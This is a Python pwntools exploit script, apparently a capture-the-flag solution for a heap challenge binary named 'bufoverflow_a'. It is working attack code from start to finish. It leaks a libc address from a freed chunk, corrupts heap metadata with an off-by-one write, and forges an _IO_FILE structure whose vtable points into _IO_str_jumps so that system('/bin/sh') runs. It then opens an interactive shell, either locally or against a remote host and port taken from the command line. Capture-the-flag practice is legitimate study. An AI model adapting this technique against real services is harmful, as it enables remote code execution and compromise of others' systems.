#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os
code = ELF('./bufoverflow_a.24')
context.arch = code.arch
context.log_level = 'debug'
gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))

def add(size):
    r.sendlineafter('>> ', '1')
    r.sendlineafter('Size: ', str(size))

def delete(idx):
    r.sendlineafter('>> ', '2')
    r.sendlineafter('Index: ', str(idx))

def edit(content):
    r.sendlineafter('>> ', '3')
    r.sendafter('Content: ', flat(content))

def show():
    r.sendlineafter('>> ', '4')

def exploit(r):
    add(0x100-8) # 0
    add(0x100-8) # 1
    delete(0)
    add(0x100-8) # 0
    show()
    sleep(1) # wtf..
    tmp = r.recv(6) + '\x00\x00'
    info(tmp)
    tmp = u64(tmp)
    libc.address = tmp - libc.sym['__malloc_hook'] - 0x68
    info('%016x libc.address', libc.address)
    add(0x100-8) # 2
    add(0x100-8) # 3
    add(0x100-8) # 4
    add(0x100-8) # 5
    add(0x100-8) # 6
    delete(4)
    delete(2)
    delete(0)
    add(0x100-8)
    edit(['A'*0xf0, 0x500]) # off by one
    delete(5) # remote merge
    add(0x100-8) #2
    delete(2) 
    add(0x600-8)
    from FILE import *
    fake_file = IO_FILE_plus_struct()
    fake_file._flags = 0
    fake_file._IO_read_ptr = 0x61
    fake_file._IO_read_base = libc.sym['_IO_list_all']-0x10
    fake_file._IO_buf_base = next(libc.search('/bin/sh'))
    fake_file._mode = 0
    fake_file._IO_write_base = 0
    fake_file._IO_write_ptr = 1
    fake_file.vtable = libc.sym['_IO_file_jumps']+0xc0-8 # _IO_str_jumps
    edit(['\x00'*0x1f0, str(fake_file).ljust(0xe8, '\x00'), libc.sym['system'], '\n'])
    r.sendlineafter('>> ', '1')
    r.sendlineafter(': ', '1234')
    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
        libc = code.libc if code.libc else ELF('./bc.so.6')
    elif len(sys.argv) > 1:
        os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
        #r = remote('127.0.0.1', 4444)
        r = code.process()
        libc = ELF('/dbg64/libc-amd64.so')
    else:
        #r = remote('127.0.0.1', 4444)
        r = code.process()
        libc = code.libc if code.libc else ELF('./bc.so.6')
    exploit(r)
